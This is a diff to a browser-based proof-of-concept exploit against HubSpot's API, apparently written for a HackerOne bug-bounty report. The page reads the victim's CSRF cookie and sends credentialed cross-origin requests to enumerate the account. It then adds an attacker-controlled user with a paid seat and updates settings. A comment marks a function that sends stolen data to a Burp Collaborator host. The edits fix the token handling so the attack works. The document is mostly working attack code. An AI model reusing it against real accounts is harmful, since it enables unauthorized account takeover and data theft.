@@ -9,14 +9,22 @@
     <pre id="log"></pre>
     <script>
       // Extract 'csrf' cookie value
-      const csrfToken = document.cookie
-        .split('; ')
-        .find(row => row.startsWith('hubspotapi-csrf='))
-        ?.split('=')[1];
+    //   const csrfToken = document.cookie
+    //     .split('; ')
+    //     .find(row => row.startsWith('hubspotapi-csrf='))
+    //     ?.split('=')[1];
 
       function log(msg) {
         document.getElementById("log").textContent += msg + "\n";
       }
+
+      function getCsrfToken() {
+        return document.cookie
+            .split('; ')
+            .find(row => row.startsWith('hubspotapi-csrf='))
+            ?.split('=')[1];
+      }
+
 
       // Send exfiltrated data to Burp Collaborator
       function exfil(stage, data) {
@@ -35,9 +43,12 @@ function runExploit() {
   xhr1.open("GET", "https://app-eu1.hubspot.com/api/accounts/v1/basic-accounts/pinned", true);
   xhr1.withCredentials = true;
   xhr1.setRequestHeader("Content-Type", "application/json");
-  if (csrfToken) {
-    xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+  const token1 = getCsrfToken();
+  if (token1) {
+    xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", token1);
+    console.log(token1)
   }
+
 
   xhr1.onreadystatechange = function () {
     if (xhr1.readyState === XMLHttpRequest.DONE) {
@@ -66,13 +77,15 @@ console.log(portalId)
       xhr2.open("POST", postUrl, true);
       xhr2.withCredentials = true;
       xhr2.setRequestHeader("Content-Type", "application/json");
-      if (csrfToken) {
-        xhr1.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+      const token2 = getCsrfToken();
+      if (token2) {
+        xhr2.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", token2);
+        console.log(token2)
       }
       
 console.log("hello");
       const userData = {
-        users: [{ email: "dangerhm+3@wearehackerone.com" }],
+        users: [{ email: "dangerhm+4@wearehackerone.com" }],
         seatNames: ["service-professional-trial"],
         teamId: null,
         secondaryTeamIds: [],
@@ -107,8 +120,10 @@ console.log("hello");
           xhr3.open("PUT", putUrl, true);
           xhr3.withCredentials = true;
           xhr3.setRequestHeader("Content-Type", "application/json");
-          if (csrfToken) {
-            xhr3.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", csrfToken);
+          const token3 = getCsrfToken();
+          if (token3) {
+            xhr3.setRequestHeader("X-Hubspot-Csrf-Hubspotapi", token3);
+            console.log(token3)
           }
 
           const putData = [{
